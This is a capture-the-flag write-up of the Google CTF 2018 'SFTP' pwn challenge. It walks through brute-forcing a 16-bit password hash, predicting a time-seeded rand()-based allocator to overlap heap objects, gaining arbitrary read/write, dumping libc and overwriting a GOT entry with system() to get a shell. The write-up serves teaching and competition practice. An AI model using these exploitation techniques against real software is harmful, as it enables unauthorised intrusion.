# Google CTF 2018: SFTP (pwn, 181pt)

This challenge was one of the easier challenges from Google CTF, based on solve
count (60), but it still
wasn't easy! I enjoyed it, because I got to play around with heap
exploitation concepts, without knowing all the intricate details of how conventional
allocators work (read on to find out why!).

## Recon

For this challenge, we are provided with a single x86 ELF binary file, `sftp`,
along with the address and port of a remote service.

```
$ file sftp
sftp: ELF 64-bit LSB pie executable x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=b15828393908d800f35ca33917dfd015daff8340, stripped

$ checksec --file sftp
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH    FORTIFY   Fortified Fortifiable  FILE
Partial RELRO   Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH Yes       3         9            sftp
```

As we can see, it has all the usual fortifications (NX, PIE, stack canary),
and we can safely assume that the remote service will have ASLR enabled.

When we run the binary, we are presented with a fake ssh-like login prompt,
which kicks us out if we provide an incorrect password.

```
$ ./sftp 
The authenticity of host 'sftp.google.ctf (3.13.3.7)' can't be established.
ECDSA key fingerprint is SHA256:+d+dnKGLreinYcA8EogcgjSF3yhvEBL+6twxEc04ZPq.

Warning: Permanently added 'sftp.google.ctf' (ECDSA) to the list of known hosts.
c01db33f@sftp.google.ctf's password: hunter2
$
```

We can patch out the login check for debugging purposes, but we're going to need
to reverse engineer it at some point, in order to exploit the remote system.
Putting 2 NOPs at file offset 0x145C is a simple way to make this check always pass.

```

Helpfully, the program contains (most of) it's own source!
[sftp.c](https://gist.github.com/DavidBuchanan314/45824ebb8cc20fba80e42c4d249b1a64)

## "Authentication"

As I said earlier, we need to find a way past that login prompt.
The first thing to look at is the `authenticate_user` function:

```c
bool authenticate_user() {
  char password[16];
  uint16_t hash = 0x5417;
  printf("%s@%s's password: ", user_name, host_name);
  if (scanf("%15s", password)) {
    getc(stdin);
    for (char* ptr = password; *ptr; ++ptr) {
      hash ^= *ptr;
      hash <<= 1;
    }
    if (hash == 36346) {
      return true;
    }
  }
  return false;
}
```

Given that it's just a 16-bit hash function, we can trivially bruteforce a hash
collision.

I wrote a simple python script to find collisions:

```python
def checkpass(password):
    hash = 0x5417
    for c in password:
        hash ^= c
        hash <<= 1
        hash &= 0xFFFF
    return hash == 36346

for line in open("/usr/share/dict/words").readlines():
    key = line.strip().upper()
    if checkpass(key.encode()):
        print(key)
```

It spits out a list of several matches, let's go with `DEBUG` (I wonder if this
was the "intended" password?).

## Heap ~~Feng Shui~~ Stuff

With that out of the way, we can start looking for actual vulnerabilities.
There isn't that much of interest in the provided source, except the dubiously
named `#include "secure_allocator.h"`. We aren't given the source for this header
file, so it's time to break out IDA and have a look around:

```c
void *malloc()
{
  return (void *)(rand() & 0x1FFFFFFF | 0x40000000LL);
}

void *realloc(void *a1)
{
  return a1;
}

void free(void *a1)
{
  ;
}
```

Yup, very secure. At least it isn't vulnerable to unlink exploits!

If we can make some allocations overlap, by "chance", then we can start exploiting
things. To do this reliably, it helps to be able to predict `rand()`. There are
a couple of functions in the `init_array`, one of which mmap's the heap into existence
at `0x40000000`, and then does `srand(time(NULL))` i.e. seeds the RNG with the current
time. As long as our local time is synced to the remote system, to within 1 second,
then we can reliably predict the remote RNG, and therefore predict exactly how
the remote heap will be laid out, so that we can exploit overlaping allocations.

Time to start exploiting! Lets take a look at some of the structs that will end up on the heap:

```c
struct entry {
  struct directory_entry* parent_directory;
  enum entry_type type;
  char name[name_max];
};

struct file_entry {
  struct entry entry;

  size_t size;
  char* data;
};
```

`file_entry` looks like the most easily exploitable datastructure.
If we can overwrite the data pointer (due to the data allocation of another file
overlapping it), then we have an arbitrary read/write primitive with the `get`
and `put` commands.

Now that we have a r/w primitive, we need to overwrite a function pointer to get
code execution. Overwriting a GOT entry to point to `system()` (or a "magic gadget")
would be a good idea. However, to access the GOT, we need to find the PIE ASLR offset.

The only data we reliably know the location of, is the data on the heap. Since all
the addresses of the `sftp` binary begin with `0x555555` (in gdb with ASLR disabled)
, we can use a bit of a hack to scan the heap for references to the main binary in gdb/peda:

```
gdb-peda$ find "UUU" 0x40000000 0x60100000
Searching for 'UUU' in range: 0x40000000 - 0x60100000
Found 1 results, display max 1 items:
mapped : 0x4926df34 --> 0x10000555555
gdb-peda$ x/1x 0x4926df31
0x4926df31:	0x000055555575cbe0
```

After a quick inspection of the disassembled code, it would appear that this
is the reference to the "root" file node, which is set up in one of the `init_array` functions.
Using this reference to the root file node, we can read and write the GOT entries.

# Implementation

```

First of all, I make sure that my local time and the remote server time are synced
up. I use the python `ctypes` module to call the libc `srand` and `rand` functions,
in order to replicate and predict the remote `malloc` implementation.

Then, I simulate the creation of new file nodes, until I detect a pair that are close
enough such that the data region of one can overwrite the file node of another. After
that, I send the commands to the server to *actually* create the files.

The creation of the read/write primitive is simple, I just use `ctypes` again to
create a new `file_entry` struct, which overwrites an existing one. I called
this crafted file "hacked", so that I could trigger arbitrary reads and writes
by sending the `get hacked` or `put hacked` commands.

Unfortunately, I was unable to work out the remote libc version using any online
libc databases. To get around this, I dumped the entire libc from memory (using
my arbitrary read primitive), and analysed it with IDA to find the `system` function.

I decided to replace the `strtok` GOT entry with `system`, so that sending the command
`get /bin/sh` will spawn a shell, which we can use to cat the flag:

```
cat /home/user/flag
CTF{Moar_Randomz_Moar_Mitigatez!}
```

## Improvements

After solving this, a teammate told me about pwntools' [DynELF](http://docs.pwntools.com/en/stable/dynelf.html) functionality.
It effectively automates my "dump libc to find system()" process, except much
more efficiently because it doesn't have to dump the entirely binary.

Using it is as simple as this:

```python
d = DynELF(read_mem, libc_rand)
libc_system = d.lookup("system")
```
